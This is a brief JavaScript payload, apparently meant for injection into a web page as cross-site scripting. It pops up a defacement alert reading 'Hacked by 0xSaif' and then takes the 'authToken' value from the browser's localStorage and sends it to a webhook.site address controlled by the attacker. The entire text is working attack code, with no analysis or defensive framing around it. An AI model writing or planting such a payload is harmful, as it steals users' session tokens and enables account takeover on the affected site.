alert("Hacked by 0xSaif 👾");

const token = localStorage.getItem("authToken");
if (token) {
  fetch("https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?token=" + encodeURIComponent(token));
}

